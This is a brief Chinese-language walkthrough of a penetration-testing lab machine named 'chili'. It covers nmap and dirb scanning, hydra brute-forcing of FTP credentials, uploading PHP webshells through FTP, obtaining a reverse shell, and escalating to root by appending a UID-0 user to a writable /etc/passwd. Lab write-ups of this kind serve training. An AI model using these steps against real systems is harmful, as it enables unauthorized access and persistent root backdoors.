信息收集

主机发现

nmap -sn 192.168.50.0/24

端口扫描

nmap -sS -p- -T5 --min-rate 10000 -sV -O 192.168.50.162

发现开放了 21 和 80 端口

目录扫描

dirb http://192.168.50.162 /usr/share/dirb/wordlists/common.txt

没有什么可用的信息，查看一下 web 界面

80 端口没有什么可用的信息，查看一下 21 端口，看能否通过默认账号登录 (anonymous/随便邮箱或空密码)

登录失败，只能尝试爆破 (hydra)

ftp爆破

由于很长时间都没有爆破成功，返回去查看这个靶机介绍，显示

通过介绍可以尝试账户名是 chili

hydra -l chili -P /usr/share/wordlists/rockyou.txt ftp://192.168.50.162 -vV -f

最终得出账号密码 (chili / a1b2c3d4)

显示230，证明登陆成功

可以切换到网站目录，查看权限，发现 .nano 目录是可读可写可执行的，尝试写入一句话木马

分别上传到目标

查看之后发现没有权限，那么之前访问不到也是有可能没有权限才访问不到

chmod 777 1.php
chmod 777 2.php
chmod 777 shell.php

拿蚁剑测试看能否连接成功

OK，成功连接，尝试使用蚁剑去反弹shell，发现失败

看来只能使用之前的shell.php来进行连接

成功反弹，使用python代码将终端格式化

python3 -c 'import pty;pty.spawn("/bin/bash")'

查看一下能否提权

sudo -l
find / -perm -4000 2>&/dev/null

发现并没有，查看一下一些系统信息

uname -a // 2020版本的

发现这个passwd文件尽然开放着写权限

通过openssl生成密码直接添加用户

openssl添加用户

openssl passwd -1 -salt shell[用户] 123[密码]

根据passwd目录生成一行数据

echo 'shell:$1$shell$5TvJA7y/9faSDWR84IKgZ/:0:0:root:/root:/bin/bash' >> /etc/passwd
